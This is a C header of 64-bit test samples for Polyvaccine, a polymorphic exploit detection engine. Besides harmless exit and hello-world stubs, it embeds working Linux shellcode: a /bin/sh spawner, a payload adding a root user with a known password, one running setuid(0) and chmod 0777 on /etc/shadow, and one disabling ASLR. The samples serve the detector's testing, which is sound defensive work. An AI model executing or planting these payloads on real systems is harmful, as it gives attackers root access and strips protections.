/* 
 * Polyvaccine a Polymorphic exploit detection engine.
 *                                                              
 * Copyright (C) 2009  Luis Campo Giralte 
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Library General Public
 * License as published by the Free Software Foundation; either
 * version 2 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Library General Public License for more details.
 *
 * You should have received a copy of the GNU Library General Public
 * License along with this library; if not, write to the
 * Free Software Foundation, Inc., 51 Franklin St, Fifth Floor,
 * Boston, MA  02110-1301, USA.
 *
 * Written by Luis Campo Giralte <luis.camp0.2009@gmail.com> 2009 
 *
 */

#ifndef _EXAMPLES64_H_
#define _EXAMPLES64_H_

/* 64 bits examples */

/*
   0:	48 bb 01 00 00 00 00 	mov    rbx,0x1
   7:	00 00 00 
   a:	48 b8 3c 00 00 00 00 	mov    rax,0x3c
  11:	00 00 00 
  14:	48 bf 01 00 00 00 00 	mov    rdi,0x1
  1b:	00 00 00 
  1e:	0f 05                	syscall 
*/
int size_exit_1_64bits = 32; 
char exit_1_64bits[] =
	"\x48\xbb\x01\x00\x00\x00\x00"
	"\x00\x00\x00"
	"\x48\xb8\x3c\x00\x00\x00\x00"
	"\x00\x00\x00"
	"\x48\xbf\x01\x00\x00\x00\x00"
	"\x00\x00\x00"
	"\x0f\x05";

int size_exit_9_64bits = 32;
char exit_9_64bits[] =
        "\x48\xbb\x01\x00\x00\x00\x00"
        "\x00\x00\x00"
        "\x48\xb8\x3c\x00\x00\x00\x00"
        "\x00\x00\x00"
        "\x48\xbf\x09\x00\x00\x00\x00"
        "\x00\x00\x00"
        "\x0f\x05";

int size_shellcode_64bits = 48;
char shellcode_64bits [] = 
	"\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68"
	"\x11\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8"
	"\x3b\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8"
	"\x38\x0f\x05";

int size_helloworld = 912;
char helloworld[] =
	"\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x01\x00\x3e\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x40\x00"
	"\x07\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
	"\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00"
	"\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x10\x02\x00\x00\x00\x00\x00\x00\x39"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x0d\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00\x00"
	"\x00\x00\x00\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90"
	"\x02\x00\x00\x00\x00\x00\x00\xa8\x00\x00\x00\x00\x00\x00\x00"
	"\x05\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00"
	"\x00\x18\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x03\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x40\x03\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x27\x00"
	"\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x70\x03\x00\x00\x00\x00\x00\x00"
	"\x18\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02\x00\x00"
	"\x00\x04\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00"
	"\x00\x00\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21"
	"\x0a\x00\x00\x48\xb8\x01\x00\x00\x00\x00\x00\x00\x00\x48\xbf"
	"\x01\x00\x00\x00\x00\x00\x00\x00\x48\xbe\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x48\xba\x0f\x00\x00\x00\x00\x00\x00\x00\x0f\x05"
	"\x48\xb8\x3c\x00\x00\x00\x00\x00\x00\x00\x48\x31\xff\x0f\x05"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x64\x61\x74\x61\x00\x2e"
	"\x74\x65\x78\x74\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00"
	"\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x73\x74\x72\x74\x61\x62"
	"\x00\x2e\x72\x65\x6c\x61\x2e\x74\x65\x78\x74\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\xf1\xff\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x02"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x0d\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00"
	"\x00\x00\xf1\xff\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x10\x00\x02\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x68\x65\x6c\x6c\x6f\x36\x34"
	"\x2e\x61\x73\x6d\x00\x6d\x65\x73\x73\x61\x67\x65\x00\x6d\x73"
	"\x67\x6c\x65\x6e\x00\x5f\x73\x74\x61\x72\x74\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00"
	"\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

/*
Title:  Linux/x86-64 - Add root user with password - 390 bytes
Date:   2010-06-20
Tested: Archlinux x86_64 k2.6.33
  
Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
  
! Dtabase of shellcodes http://www.shell-storm.org/shellcode/
 
 
 
Add root user with password:
                             - User: shell-storm
                             - Pass: leet
                             - id  : 0
*/

int size_add_root_user_64bits = 900; 
char *add_root_user_64bits =
	/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 01204) */
        "\x48\xbb\xff\xff\xff\xff\xff\x73\x77\x64"       /* mov    $0x647773ffffffffff,%rbx */
        "\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
        "\x53"                                           /* push   %rbx */
        "\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73"       /* mov    $0x7361702f6374652f,%rbx */
        "\x53"                                           /* push   %rbx */
        "\x48\x89\xe7"                                   /* mov    %rsp,%rdi */
        "\x66\xbe\x41\x04"                               /* mov    $0x441,%si */
        "\x66\xba\x84\x02"                               /* mov    $0x284,%dx */
        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
        "\xb0\x02"                                       /* mov    $0x2,%al */
        "\x0f\x05"                                       /* syscall */
        /* write(3, "shell-storm:x:0:0:shell-storm.or"..., 46) */
        "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
        "\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
        "\x48\xbb\xff\xff\x2f\x62\x61\x73\x68\x0a"       /* mov    $0xa687361622fffff,%rbx */
	"\x48\xc1\xeb\x10"                               /* shr    $0x10,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x67\x3a\x2f\x3a\x2f\x62\x69\x6e"       /* mov    $0x6e69622f3a2f3a67,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x73\x74\x6f\x72\x6d\x2e\x6f\x72"       /* mov    $0x726f2e6d726f7473,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x30\x3a\x73\x68\x65\x6c\x6c\x2d"       /* mov    $0x2d6c6c6568733a30,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x6f\x72\x6d\x3a\x78\x3a\x30\x3a"       /* mov    $0x3a303a783a6d726f,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74"       /* mov    $0x74732d6c6c656873,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\x89\xe6"                                   /* mov    %rsp,%rsi */
	"\x48\xba\xff\xff\xff\xff\xff\xff\xff\x2e"       /* mov    $0x2effffffffffffff,%rdx */
	"\x48\xc1\xea\x38"                               /* shr    $0x38,%rdx */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x01"                                       /* mov    $0x1,%al */
	"\x0f\x05"                                       /* syscall */
	/* close(3) */
	"\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
	"\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x03"                                       /* mov    $0x3,%al */
	"\x0f\x05"                                       /* syscall */
	/* Xor */
	"\x48\x31\xdb"                                   /* xor    %rbx,%rbx */
	"\x48\x31\xff"                                   /* xor    %rdi,%rdi */
	"\x48\x31\xf6"                                   /* xor    %rsi,%rsi */
	"\x48\x31\xd2"                                   /* xor    %rdx,%rdx */
        /* open("/etc/shadow", O_WRONLY|O_CREAT|O_APPEND, 01204) */
	"\x48\xbb\xff\xff\xff\xff\xff\x64\x6f\x77"       /* mov    $0x776f64ffffffffff,%rbx */
	"\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x2f\x65\x74\x63\x2f\x73\x68\x61"       /* mov    $0x6168732f6374652f,%rbx  */
	"\x53"                                           /* push   %rbx */
	"\x48\x89\xe7"                                   /* mov    %rsp,%rdi */
	"\x66\xbe\x41\x04"                               /* mov    $0x441,%si */
	"\x66\xba\x84\x02"                               /* mov    $0x284,%dx */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x02"                                       /* mov    $0x2,%al */
	"\x0f\x05"                                       /* syscall *
	/* write(3, "shell-storm:$1$reWE7GM1$axeMg6LT"..., 59) */
	"\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
	"\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
	"\x48\xbb\xff\xff\xff\xff\xff\x3a\x3a\x0a"       /* mov    $0xa3a3affffffffff,%rbx */
	"\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x34\x37\x37\x38\x3a\x3a\x3a\x3a"       /* mov    $0x3a3a3a3a38373734,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x5a\x30\x55\x33\x4d\x2f\x3a\x31"       /* mov    $0x313a2f4d3355305a,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x73\x2f\x50\x64\x53\x67\x63\x46"       /* mov    $0x4663675364502f73,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x61\x78\x65\x4d\x67\x36\x4c\x54"       /* mov    $0x544c36674d657861,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x65\x57\x45\x37\x47\x4d\x31\x24"       /* mov    $0x24314d4737455765,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x6f\x72\x6d\x3a\x24\x31\x24\x72"       /* mov    $0x722431243a6d726f,%rbx  */
	"\x53"                                           /* push   %rbx */
	"\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74"       /* mov    $0x74732d6c6c656873,%rbx */
	"\x53"                                           /* push   %rbx */
	"\x48\x89\xe6"                                   /* mov    %rsp,%rsi */
	"\x48\xba\xff\xff\xff\xff\xff\xff\xff\x3b"       /* mov    $0x3bffffffffffffff,%rdx */
	"\x48\xc1\xea\x38"                               /* shr    $0x38,%rdx */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x01"                                       /* mov    $0x1,%al */
	"\x0f\x05"                                       /* syscall */     
	/* close(3) */
	"\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
	"\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x03"                                       /* mov    $0x3,%al */
	"\x0f\x05"                                       /* syscall */
	/* _exit(0) */
	"\x48\x31\xff"                                   /* xor    %rdi,%rdi */
	"\x48\x31\xc0"                                   /* xor    %rax,%rax */
	"\xb0\x3c"                                       /* mov    $0x3c,%al */
	"\x0f\x05";                                      /* syscall */

/*
Title:  Linux/x86-64 - setuid(0) & chmod ("/etc/passwd", 0777) & exit(0) - 63 bytes
Date:   2010-06-17
Tested: Archlinux x86_64 k2.6.33
 
Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
 
! Dtabase of shellcodes http://www.shell-storm.org/shellcode/
 
 
 
  <-- _setuid(0) -->
  400078:   48 31 ff                xor    %rdi,%rdi
  40007b:   48 31 c0                xor    %rax,%rax
  40007e:   b0 69                   mov    $0x69,%al
  400080:   0f 05                   syscall
 
  <-- _chmod("/etc/shadow", 0777) -->
  400082:   48 31 d2                xor    %rdx,%rdx
  400085:   66 be ff 01             mov    $0x1ff,%si
  400089:   48 bb ff ff ff ff ff    mov    $0x776f64ffffffffff,%rbx
  400090:   64 6f 77
  400093:   48 c1 eb 28             shr    $0x28,%rbx
  400097:   53                      push   %rbx
  400098:   48 bb 2f 65 74 63 2f    mov    $0x6168732f6374652f,%rbx
  40009f:   73 68 61
  4000a2:   53                      push   %rbx
  4000a3:   48 89 e7                mov    %rsp,%rdi
  4000a6:   48 31 c0                xor    %rax,%rax
  4000a9:   b0 5a                   mov    $0x5a,%al
 
  <-- _exit(0) -->
  4000ab:   0f 05                   syscall
  4000ad:   48 31 ff                xor    %rdi,%rdi
  4000b0:   48 31 c0                xor    %rax,%rax
  4000b3:   b0 3c                   mov    $0x3c,%al
  4000b5:   0f 05                   syscall
*/

int size_setuid_64bits = 63;
char *setuid_64bits =  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
            "\x48\x31\xd2\x66\xbe\xff\x01\x48\xbb\xff"
            "\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xeb"
            "\x28\x53\x48\xbb\x2f\x65\x74\x63\x2f\x73"
            "\x68\x61\x53\x48\x89\xe7\x48\x31\xc0\xb0"
            "\x5a\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0"
            "\x3c\x0f\x05";

/*
Title:  Linux/x86-64 - Disable ASLR Security - 143 bytes
Date:   2010-06-17
Tested: Archlinux x86_64 k2.6.33
 
Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
 
! Dtabase of shellcodes http://www.shell-storm.org/shellcode/
 
 
Description:
============
 Address space layout randomization (ASLR) is a computer security technique
 which involves randomly arranging the positions of key data areas, usually
 including the base  of the executable and position of libraries, heap, and
 stack, in a process's address space.
 
 This shellcode disables the ASLR.
 
*/
char *disable_aslr_64bits =
           /*  open("/proc/sys/kernel/randomize_va_space", O_WRONLY|O_CREAT|O_APPEND, 0644) */
 
           "\x48\x31\xd2"                                // xor    %rdx,%rdx
           "\x48\xbb\xff\xff\xff\xff\xff\x61\x63\x65"    // mov    $0x656361ffffffffff,%rbx
           "\x48\xc1\xeb\x28"                            // shr    $0x28,%rbx                 
           "\x53"                                        // push   %rbx
           "\x48\xbb\x7a\x65\x5f\x76\x61\x5f\x73\x70"    // mov    $0x70735f61765f657a,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x2f\x72\x61\x6e\x64\x6f\x6d\x69"    // mov    $0x696d6f646e61722f,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x73\x2f\x6b\x65\x72\x6e\x65\x6c"    // mov    $0x6c656e72656b2f73,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x2f\x70\x72\x6f\x63\x2f\x73\x79"    // mov    $0x79732f636f72702f,%rbx
           "\x53"                                        // push   %rbx
           "\x48\x89\xe7"                                // mov    %rsp,%rdi
           "\x66\xbe\x41\x04"                            // mov    $0x441,%si
           "\x66\xba\xa4\x01"                            // mov    $0x1a4,%dx
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x02"                                    // mov    $0x2,%al
           "\x0f\x05"                                    // syscall
 
 
           /* write(3, "0\n", 2) */
 
           "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"    // mov    $0x3ffffffffffffff,%rdi
           "\x48\xc1\xef\x38"                            // shr    $0x38,%rdi
           "\x48\xbb\xff\xff\xff\xff\xff\xff\x30\x0a"    // mov    $0xa30ffffffffffff,%rbx
           "\x48\xc1\xeb\x30"                            // shr    $0x30,%rbx
           "\x53"                                        // push   %rbx
           "\x48\x89\xe6"                                // mov    %rsp,%rsi
           "\x48\xba\xff\xff\xff\xff\xff\xff\xff\x02"    // mov    $0x2ffffffffffffff,%rdx
           "\x48\xc1\xea\x38"                            // shr    $0x38,%rdx
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x01"                                    // mov    $0x1,%al
           "\x0f\x05"                                    // syscall
 
 
           /* _exit(0) */
 
           "\x48\x31\xff"                                // xor    %rdi,%rdi
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x3c"                                    // mov    $0x3c,%al
           "\x0f\x05";                                   // syscall



#endif
